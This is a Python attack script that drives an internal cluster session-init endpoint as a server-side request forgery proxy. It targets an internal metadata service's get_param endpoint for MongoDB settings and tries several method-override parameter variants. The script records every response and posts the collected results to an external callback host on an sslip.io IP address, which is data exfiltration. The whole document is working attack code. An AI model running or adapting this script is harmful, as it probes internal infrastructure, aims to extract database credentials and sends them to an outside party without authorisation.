#!/usr/bin/env python3
import json,time,urllib.request,urllib.error,os,pathlib
B='http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local/session/init'; S='https://54.209.51.244.sslip.io/callback/snapgpt-metaserve-method2-20261106'
hosts=[
 ('health','http://lrs-metaserve-01/health#'),
 ('openapi','http://lrs-metaserve-01/openapi.json#'),
 ('param','http://lrs-metaserve-01/get_param?param_key=MONGODB#'),
 ('param_method','http://lrs-metaserve-01/get_param?param_key=MONGODB&_method=POST#'),
 ('param_dunder','http://lrs-metaserve-01/get_param?param_key=MONGODB&__method=POST#'),
 ('param_method2','http://lrs-metaserve-01/get_param?param_key=MONGODB&method=POST#'),
 ('param_http','http://lrs-metaserve-01/get_param?param_key=MONGODB&http_method=POST#'),
 ('param_pod','http://lrs-metaserve-01/get_param?param_key=MONGODB&pod=slserver#'),
 ('param_replica','http://lrs-metaserve-01/get_param?param_key=MONGODB&pod=slserver&params%5Breplica_set%5D=slserver#'),
 ('param_encoded_method','http://lrs-metaserve-01/get_param?param_key=MONGODB&_method=POST&method=POST#'),
]
O={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'host':os.uname().nodename,'cases':[]}
for i,(n,h) in enumerate(hosts):
 b={'user_id':'ms-method2-%d@armorerlabs.com'%i,'host_url':h,'project_path':'x','project_id':'__mismatch__','force':True}
 q=urllib.request.Request(B,data=json.dumps(b,separators=(',',':')).encode(),method='POST',headers={'Content-Type':'application/json','X-SL-Token':'x'})
 r={'name':n,'host':h};t=time.monotonic()
 try:
  with urllib.request.urlopen(q,timeout=5) as x:r.update(status=x.status,body=x.read(12000).decode('utf-8','replace'))
 except urllib.error.HTTPError as e:r.update(status=e.code,body=e.read(12000).decode('utf-8','replace'))
 except Exception as e:r.update(error=repr(e))
 r['elapsed']=round(time.monotonic()-t,3);O['cases'].append(r)
raw=json.dumps(O,sort_keys=True,separators=(',',':')).encode();pathlib.Path('/tmp/workspace/ms_method2.json').write_bytes(raw)
try:
 q=urllib.request.Request(S,data=raw,method='POST',headers={'Content-Type':'application/json'})
 with urllib.request.urlopen(q,timeout=20) as x:O['sink']={'status':x.status,'body':x.read(500).decode('utf-8','replace'),'bytes':len(raw)}
except Exception as e:O['sink']={'error':repr(e),'bytes':len(raw)}
print(json.dumps(O,sort_keys=True,separators=(',',':')))
